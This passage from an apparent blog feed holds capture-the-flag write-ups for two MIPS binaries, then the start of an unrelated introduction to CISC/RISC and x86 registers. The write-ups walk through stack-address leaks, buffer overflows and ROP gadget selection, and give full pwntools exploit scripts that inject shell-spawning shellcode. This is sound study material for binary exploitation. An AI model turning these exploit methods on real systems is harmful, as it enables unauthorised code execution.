<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># interactive terminal</span><br><span class="line">$ qemu-mipsel -L ./ -g 1234 ./Mplogin</span><br><span class="line">-----we1c0me t0 MP l0g1n s7stem-----</span><br><span class="line">Username : admin6789012345678901234</span><br><span class="line">Correct name : admin6789012345678901234��@�</span><br><span class="line">                                            @</span><br><span class="line"></span><br><span class="line"># in pwndbg we check stack content</span><br><span class="line">pwndbg&gt; stack 30</span><br><span class="line">00:0000│ s8 fp sp 0x40800298 ◂— 0x0</span><br><span class="line">01:0004│          0x4080029c —▸ 0x408002b0 ◂— 0x696d6461 (&#x27;admi&#x27;)</span><br><span class="line">02:0008│          0x408002a0 —▸ 0x400d59 ◂— 0x43000000</span><br><span class="line">03:000c│          0x408002a4 ◂— 0x0</span><br><span class="line">04:0010│          0x408002a8 ◂— 0x418e50</span><br><span class="line">05:0014│          0x408002ac ◂— 0x0</span><br><span class="line">06:0018│          0x408002b0 ◂— 0x696d6461 (&#x27;admi&#x27;)</span><br><span class="line">07:001c│          0x408002b4 ◂— 0x3837366e (&#x27;n678&#x27;)</span><br><span class="line">08:0020│          0x408002b8 ◂— 0x32313039 (&#x27;9012&#x27;)</span><br><span class="line">09:0024│          0x408002bc ◂— 0x36353433 (&#x27;3456&#x27;)</span><br><span class="line">0a:0028│          0x408002c0 ◂— 0x30393837 (&#x27;7890&#x27;)</span><br><span class="line">0b:002c│          0x408002c4 ◂— 0x34333231 (&#x27;1234&#x27;)</span><br><span class="line">0c:0030│          0x408002c8 —▸ 0x408002d0 —▸ 0x40007010 ◂— 0x0</span><br><span class="line">0d:0034│          0x408002cc —▸ 0x400b90 (main+164) ◂— lw     $gp, 0x10($fp)</span><br><span class="line">0e:0038│          0x408002d0 —▸ 0x40007010 ◂— 0x0</span><br><span class="line">0f:003c│          0x408002d4 ◂— 0x0</span><br><span class="line">10:0040│          0x408002d8 ◂— 0x2</span><br></pre></td></tr></table></figure>
<p>So if we send <code>24</code> bytes without <code>\x00</code> at the end, we can leak <code>0x408002d0</code> at <code>0x408002c8</code>(on the stack), and <code>0x408002d0</code> itself is also a stack address.</p>
<p>Since this challenge with NX disabled, we can write shellcodes to stack and execute, and using ROP to jump back to shellcode address (better the address we leaked, like <code>0x408002d0</code> we already got).</p>
<p>Here is the exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;Mplogin&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./Mplogin&quot;</span>])</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack(old fp)</span></span><br><span class="line">sh.sendafter(<span class="string">b&quot;name : &quot;</span>,<span class="string">&quot;admin&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;Correct name : &quot;</span>)</span><br><span class="line">sh.recv(<span class="number">0x18</span>)</span><br><span class="line">stack = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,stack,<span class="built_in">hex</span>(stack),<span class="string">&quot;type:&quot;</span>,<span class="built_in">type</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment"># stack overflow</span></span><br><span class="line">sh.sendafter(<span class="string">b&quot;Pre_Password : &quot;</span>,<span class="string">b&quot;access&quot;</span>.ljust(<span class="number">0x14</span>,<span class="string">b&quot;2&quot;</span>)+p32(<span class="number">0x100</span>))</span><br><span class="line">sh.sendafter(<span class="string">b&quot;Password : &quot;</span>,<span class="string">b&quot;0123456789&quot;</span>.ljust(<span class="number">0x28</span>,<span class="string">b&quot;2&quot;</span>)+p32(stack)+asm(shellcraft.sh()))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="HWS2020-pwn-mipsel"><a href="#HWS2020-pwn-mipsel" class="headerlink" title="HWS2020 - pwn - mipsel"></a>HWS2020 - pwn - mipsel</h3><p>Attachment: <a href="/filehost/ampi/pwn">pwn</a><br>Check the file (mips and static)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file pwn</span><br><span class="line">pwn: ELF 32-bit MSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e0782ebdf0d70b808dba4b10c6866faeae35c620, not stripped</span><br><span class="line"></span><br><span class="line">$ checksec pwn</span><br><span class="line">[*] &#x27;/root/pwn&#x27;</span><br><span class="line">    Arch:     mips-32-big</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<p>In <code>pwn()</code> we find that a <code>0x200</code> v6 reads <code>0x300</code> which triggers overflow,</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">pwn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// $v0</span></span><br><span class="line">  _BOOL4 result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [sp+0h] [+0h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">2</span>]; <span class="comment">// [sp+10h] [+10h] BYREF</span></span><br><span class="line">  _BYTE *v5; <span class="comment">// [sp+18h] [+18h]</span></span><br><span class="line">  _BYTE *v6; <span class="comment">// [sp+1Ch] [+1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+20h] [+20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [sp+24h] [+24h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [sp+28h] [+28h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+2Ch] [+2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [sp+30h] [+30h]</span></span><br><span class="line">  <span class="keyword">int</span> *v12; <span class="comment">// [sp+34h] [+34h]</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// [sp+38h] [+38h]</span></span><br><span class="line">  <span class="keyword">int</span> *v14; <span class="comment">// [sp+3Ch] [+3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// [sp+40h] [+40h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [sp+44h] [+44h]</span></span><br><span class="line">  _BYTE *v17; <span class="comment">// [sp+48h] [+48h]</span></span><br><span class="line">  <span class="keyword">int</span> v18[<span class="number">3</span>]; <span class="comment">// [sp+4Ch] [+4Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v6 = (_BYTE *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Enter the group number: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !_isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v18) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v18[<span class="number">0</span>] || v18[<span class="number">0</span>] &gt;= <span class="number">0xA</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fwrite</span>(<span class="string">&quot;The numbers is illegal! Exit...\n&quot;</span>, <span class="number">1</span>, <span class="number">32</span>, stderr);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v18[<span class="number">1</span>] = (<span class="keyword">int</span>)&amp;v3;</span><br><span class="line">  v9 = <span class="number">36</span>;</span><br><span class="line">  v10 = <span class="number">36</span> * v18[<span class="number">0</span>];</span><br><span class="line">  v11 = <span class="number">36</span> * v18[<span class="number">0</span>] - <span class="number">1</span>;</span><br><span class="line">  v12 = v4;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="number">36</span> * v18[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i &lt; v18[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v13 = (<span class="keyword">int</span> *)((<span class="keyword">char</span> *)v12 + i * v9);</span><br><span class="line">    v14 = v13;</span><br><span class="line">    <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter the id and name, separated by `:`, end with `.` . eg =&gt; &#x27;1:Job.&#x27; &quot;</span>);</span><br><span class="line">    v15 = <span class="built_in">read</span>(<span class="number">0</span>, v6, <span class="number">0x300</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="built_in">atoi</span>(v6);</span><br><span class="line">      *v14 = v0;</span><br><span class="line">      v16 = <span class="built_in">strchr</span>(v6, <span class="number">58</span>);</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; v6++; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *v6 == <span class="number">10</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v6;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v17 = &amp;v5[-v16];</span><br><span class="line">      <span class="keyword">if</span> ( !v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;format error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(v14 + <span class="number">1</span>, v16 + <span class="number">1</span>, v17);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">      v14[<span class="number">1</span>] = <span class="number">1633771776</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And the <code>memcpy(v14 + 1, v16 + 1, v17);</code> moves heap contents (<code>v16 +1</code>) to stack (<code>v14 + 1</code>) which causes stack overflow.</p>
<p>Before ROP we have to determine the paddings. Using <code>cyclic</code> doesn’t give a result, while entering <code>a * big num</code> works, due to the logic:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">if</span> ( i &gt;= v18[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// asm as follow</span></span><br><span class="line">   <span class="number">0x400994</span> &lt;pwn+<span class="number">864</span>&gt;    lw     $v1, <span class="number">0x20</span>($fp)</span><br><span class="line">   <span class="number">0x400998</span> &lt;pwn+<span class="number">868</span>&gt;    lw     $v0, <span class="number">0x4c</span>($fp)</span><br><span class="line">   <span class="number">0x40099c</span> &lt;pwn+<span class="number">872</span>&gt;    sltu   $v0, $v1, $v0</span><br><span class="line">   <span class="number">0x4009a0</span> &lt;pwn+<span class="number">876</span>&gt;    bnez   $v0, pwn+<span class="number">376</span>                  &lt;<span class="number">0x4007ac</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>At that time we get <code>$v0</code> &gt; <code>$v1</code> is using <code>cyclic</code></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="built_in">V0</span>   <span class="number">0x79616161</span> (<span class="string">&#x27;yaaa&#x27;</span>)    <span class="comment">; from the variable we input in stack</span></span><br><span class="line"><span class="built_in">V1</span>   <span class="number">0x6e616162</span> (<span class="string">&#x27;naab&#x27;</span>)    <span class="comment">; from </span></span><br></pre></td></tr></table></figure>
<p>Therefore we enter <code>&lt;0x4007ac&gt;</code> to trigger <code>Program received signal SIGSEGV, Segmentation fault.</code> and crash here:</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x4007d4</span> &lt;pwn+<span class="number">416</span>&gt;    <span class="keyword">lw </span>    $<span class="built_in">a0</span>, <span class="number">0x1c</span>($<span class="built_in">fp</span>)</span><br><span class="line">► <span class="number">0x4007d8</span> &lt;pwn+<span class="number">420</span>&gt;    <span class="keyword">lw </span>    $<span class="built_in">v0</span>, -<span class="number">0x7f98</span>($<span class="built_in">gp</span>)</span><br><span class="line">  <span class="number">0x4007dc</span> &lt;pwn+<span class="number">424</span>&gt;    <span class="keyword">move </span>  $<span class="built_in">t9</span>, $<span class="built_in">v0</span></span><br><span class="line">  <span class="number">0x4007e0</span> &lt;pwn+<span class="number">428</span>&gt;    <span class="keyword">bal </span>   memset                        &lt;<span class="number">0x41c0a0</span>&gt;</span><br></pre></td></tr></table></figure>
<p>While if we use a bunch of <code>a</code>, we can trigger <code>jr $ra</code></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">  <span class="number">0x400a48</span> &lt;pwn+<span class="number">1044</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s3</span>, <span class="number">0x64</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a4c</span> &lt;pwn+<span class="number">1048</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s2</span>, <span class="number">0x60</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a50</span> &lt;pwn+<span class="number">1052</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s1</span>, <span class="number">0x5c</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a54</span> &lt;pwn+<span class="number">1056</span>&gt;     <span class="keyword">lw </span>    $<span class="built_in">s0</span>, <span class="number">0x58</span>($<span class="built_in">sp</span>)</span><br><span class="line">  <span class="number">0x400a58</span> &lt;pwn+<span class="number">1060</span>&gt;     <span class="keyword">addiu </span> $<span class="built_in">sp</span>, $<span class="built_in">sp</span>, <span class="number">0x80</span></span><br><span class="line">► <span class="number">0x400a5c</span> &lt;pwn+<span class="number">1064</span>&gt;     <span class="keyword">jr </span>    $<span class="built_in">ra</span>                           &lt;<span class="number">0x7a7a7a7a</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x400a60</span> &lt;pwn+<span class="number">1068</span>&gt;     <span class="keyword">nop</span></span><br><span class="line"><span class="keyword"></span>  <span class="number">0x400a64</span> &lt;<span class="keyword">banner&gt; </span>      <span class="keyword">addiu </span> $<span class="built_in">sp</span>, $<span class="built_in">sp</span>, -<span class="number">0x20</span></span><br><span class="line">  <span class="number">0x400a68</span> &lt;<span class="keyword">banner+4&gt; </span>    <span class="keyword">sw </span>    $<span class="built_in">ra</span>, <span class="number">0x1c</span>($<span class="built_in">sp</span>)</span><br></pre></td></tr></table></figure>
<p>After debugging we get offset as <code>0x90</code>.</p>
<p>Then think about ROP.<br>On <code>x86</code> arch we can use <code>jmp esp</code> to execute shellcode in stack, whle on <code>mips</code> arch we use similar methods to call stack address.</p>
<p>Here we use <code>mipsrop</code> in <code>IDA Pro</code>, use <code>mipsrop.stackfinder()</code> to find gadgets jumping back to stack:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.stackfinder()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x004273C4</span>  |  addiu $a2,$sp,<span class="number">0x70</span>+var_C                            |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x0042BCD0</span>  |  addiu $a2,$sp,<span class="number">0x88</span>+var_C                            |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0042FA00</span>  |  addiu $v1,$sp,<span class="number">0x138</span>+var_104                         |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x004491F8</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044931C</span>  |  addiu $v0,$sp,<span class="number">0x30</span>+var_8                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x00449444</span>  |  addiu $a2,$sp,<span class="number">0x44</span>+var_C                            |  jalr  $s1                             |</span><br><span class="line">|  <span class="number">0x0044AD58</span>  |  addiu $a1,$sp,<span class="number">0x60</span>+var_28                           |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0044AEFC</span>  |  addiu $a1,$sp,<span class="number">0x64</span>+var_28                           |  jalr  $s5                             |</span><br><span class="line">|  <span class="number">0x0044B154</span>  |  addiu $a1,$sp,<span class="number">0x6C</span>+var_38                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B1EC</span>  |  addiu $v0,$sp,<span class="number">0x6C</span>+var_40                           |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044B3EC</span>  |  addiu $v0,$sp,<span class="number">0x170</span>+var_130                         |  jalr  $s0                             |</span><br><span class="line">|  <span class="number">0x00454E94</span>  |  addiu $s7,$sp,<span class="number">0xB8</span>+var_98                           |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x00465BEC</span>  |  addiu $a1,$sp,<span class="number">0xC4</span>+var_98                           |  jalr  $s0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">13</span> matching gadgets</span><br></pre></td></tr></table></figure>
<p>These gadgets do <code>Action</code> and then jump according to <code>Control Jump</code>.<br>These gadgets can store things on stack to <code>$a1</code>, <code>$a2</code>, <code>$v0</code>, <code>$v1</code> and so on.<br>What we need is some jump to these regs, and the right shellcode layout.<br>Here we use <code>mipsrop.tails()</code> and <code>mipsrop.doubles()</code> to check</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Python&gt;mipsrop.tails()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x0041F518</span>  |  move $t9,$s1                                        |  jr    $s1                             |</span><br><span class="line">|  <span class="number">0x0041F538</span>  |  move $t9,$s1                                        |  jr    $s1                             |</span><br><span class="line">|  <span class="number">0x00421684</span>  |  move $t9,$a2                                        |  jr    $a2                             |</span><br><span class="line">|  <span class="number">0x0045882C</span>  |  move $t9,$v0                                        |  jr    $v0                             |</span><br><span class="line">|  <span class="number">0x00458884</span>  |  move $t9,$v0                                        |  jr    $v0                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">5</span> matching gadgets</span><br><span class="line">Python&gt;mipsrop.doubles()</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  Address     |  Action                                              |  Control Jump                          |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">|  <span class="number">0x0042CB68</span>  |  move $t9,$s2                                        |  jalr  $s2                             |</span><br><span class="line">|  <span class="number">0x0044BEA4</span>  |  move $t9,$s4                                        |  jalr  $s4                             |</span><br><span class="line">|  <span class="number">0x0047339C</span>  |  move $t9,$s3                                        |  jalr  $s3                             |</span><br><span class="line">----------------------------------------------------------------------------------------------------------------</span><br><span class="line">Found <span class="number">11</span> matching gadgets</span><br></pre></td></tr></table></figure>
<p>We choose the first line: <code>0x004273C4</code> using <code>$a2</code></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">004271</span>EC var_C           = -<span class="number">0xC</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>C4                 <span class="keyword">addiu </span>  $<span class="built_in">a2</span>, $<span class="built_in">sp</span>, <span class="number">0x70</span>+var_C   <span class="comment">; var_c</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>D4                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">s0</span></span><br><span class="line">...</span><br><span class="line"><span class="symbol">.text:</span><span class="number">004273</span>E8                 <span class="keyword">jalr </span>   $<span class="built_in">t9</span></span><br></pre></td></tr></table></figure>
<p>And <code>0x00421684</code> jumping to <code>$a2</code></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00421684</span>                 <span class="keyword">move </span>   $<span class="built_in">t9</span>, $<span class="built_in">a2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00421688</span>                 <span class="keyword">jr </span>     $<span class="built_in">t9</span></span><br></pre></td></tr></table></figure>
<p>According to these, the exploit is:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">context(binary = filename, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">sh = process([<span class="string">&quot;qemu-mips&quot;</span>,filename])</span><br><span class="line"><span class="comment">#sh = remote(&#x27;ip&#x27;,port)</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">ra = <span class="number">0x004273C4</span> <span class="comment"># addiu $a2,$sp,0x64    	jalr $s0</span></span><br><span class="line">s0 = <span class="number">0x00421684</span> <span class="comment"># move $t9,$a2  	        jr $a2                   </span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1:&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(s0) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span> + p32(ra)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x64</span> + asm(shellcraft.sh())</span><br><span class="line">sh.sendlineafter(<span class="string">b&quot;Job.&#x27;&quot;</span>,payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>This blog is just an intro with only stack exploiting tips, actually the heap challenges of <code>arm</code>&#x2F;<code>mips</code> using <code>glib</code>&#x2F;<code>uClibc</code>&#x2F;<code>musl</code> are almost the same as these on <code>x86</code> arch.</p>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>linux</tag>
        <tag>qemu</tag>
        <tag>arm</tag>
        <tag>mips</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>Some Assembly Intro</title>
    <url>/2021/01/09/2021-01-09-Some-Assembly-Intro/</url>
    <content><![CDATA[<h2 id="CISC-and-RISC"><a href="#CISC-and-RISC" class="headerlink" title="CISC and RISC"></a>CISC and RISC</h2><p>There are two main types of computer architectures that will be covered in this project: Complex Instruction Set Computing (<code>CISC</code>) and Reduced Instruction Set Computing (<code>RISC</code>).<br>An example of <code>CISC</code> is the <code>x86</code> architecture. Examples of <code>RISC</code> are the <code>ARM</code>, the <code>MIPS</code>, and the <code>PowerPC</code> architectures.<br>The differences between <code>CISC</code> and <code>RISC</code> is their  behaviors in how they execute instructions. </p>
<h3 id="CISC"><a href="#CISC" class="headerlink" title="CISC"></a>CISC</h3><p>The <code>CISC</code> architecture aims to complete a task in as few assembly instructions as possible. This is done with an emphasis on building rich instruction sets with an emphasis on complex hardware.<br>The hardware in a <code>CISC</code> system must have the ability to interpret several series of operations at a given time.<br>The <code>CISC</code> architecture uses microcode,which is the interpreter between the hardware of a computer and the architectural level of a computer.<br>Characteristics of the <code>CISC</code> instruction set include:</p>
<ul>
<li>2-operand format: instructions have a source and destination</li>
<li>Multiple addressing modes for memory</li>
<li>Instructions that take multiple clock cycles to execute</li>
</ul>
<p>An example of a <code>CISC</code> instruction would be one that performs multiple jobs at once. There could be an instruction called <code>MULT</code> that will load two values into registers, multiply them, and then store the result in another register.</p>
<p>There  are drawbacks  to  <code>CISC</code>  as  well.<br>These  include  the  increased  complexity  of  an instruction  set, as each  new  chip  hardware  generation  must  maintain  the  same  properties  of  the previous generation.<br>Since <code>CISC</code> attempts to execute code in as few instructions as possible, the compensation is that the instructions will take more clock cycles to execute.<br>The complexity of <code>CISC</code> can be shown in the flow diagram below. </p>
<p><img src="/imghost/rpp/10.png" alt="CISC flow graph"></p>
<p><code>CISC</code> starts with the machine instructions, converts them to microcode, then converts to microinstructions, which is then executed.</p>
<h3 id="RISC"><a href="#RISC" class="headerlink" title="RISC"></a>RISC</h3><p>The <code>RISC</code> instruction set focuses on using more  simple instructions that can each be executed in just one clock cycle.<br>From the <code>CISC</code> example shown above, the <code>RISC</code> equivalent would split up the <code>MULT</code> instruction into  three different instructions: <code>LOAD</code>, <code>MULT</code>, and <code>STORE</code>.<br>The <code>RISC</code> instruction set is more emphasized on software. Separating commands into multiple instructions allows for pipelining and more efficient use of hardware.<br>Characteristics of the <code>RISC</code> instruction set include:</p>
<ul>
<li>More optimized register usage with 32 or more registers</li>
<li>Simplified compiler design by using general purpose registers</li>
<li>Use registers instead of the stack to pass arguments and hold variables</li>
<li>Reduced number of instructions (compared with <code>CISC</code>)</li>
</ul>
<p>The main drawback to <code>RISC</code> is increased instruction size from having more instructions.<br>Since <code>RISC</code> processors depend on compilers to explicitly emit each instruction, the compilers will determine the performance of the program.<br>The flow diagram of <code>RISC</code> is shown below, which is much less complex than <code>CISC</code>.</p>
<p><img src="/imghost/rpp/11.png" alt="RISC flow graph"></p>
<p>The machine instruction is executed immediately. There are no conversions that need to be made.</p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>This section will give a brief overview on how to interpret <code>x86</code> assembly code.<br>The <code>x86</code> architecture has eight general purpose registers, each 32-bits in size which can be seen below</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="built_in">EAX</span> –Extended Accumulator Register</span><br><span class="line"><span class="built_in">EBX</span> –Extended Base Register</span><br><span class="line">ECD –Extended Counter Register</span><br><span class="line"><span class="built_in">EDX</span> –Extended Data Register</span><br><span class="line"><span class="built_in">ESI</span> –Extended Source Index</span><br><span class="line"><span class="built_in">EDI</span> –Extended Destination index</span><br><span class="line"><span class="built_in">EBP</span> –Extended Base Pointer</span><br><span class="line"><span class="built_in">ESP</span> –Extended Stack Pointer</span><br></pre></td></tr></table></figure>

<p>The <code>x86</code> architecture uses  the  stack  as  the  part  of  memory  to  store  local  variables  and function arguments.<br>The stack has a Last In First Out (LIFO) structure. The <code>ESP</code> and <code>EBP</code> registers are associated with the stack, where the <code>ESP</code> (stack pointer) always points to the top of the stack.<br>The <code>EBP</code> (base pointer) is the reference on the stack that never changes. The <code>ESP</code> register is the pointer to the top of the stack when the function is first called. </p>
<p>Arithmetic  operations  follow  the  same  general  syntax.<br>For  addition  and  subtraction, the syntax is <code>ADD/SUB dest, src</code>. Where <code>ADD/SUB</code> is the operation and <code>dest</code> is the destination register and <code>src</code> is the source register.<br>Example instructions are shown below.</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add</span> <span class="built_in">eax</span>, <span class="number">7</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">eax</span>, <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>There are three possible ways to perform multiplication.<br>There is multiplication of </p>
<ul>
<li>just the <code>eax</code> register with a value,</li>
<li>two values stored into a register</li>
<li>a register with a value stored into that same register.</li>
</ul>
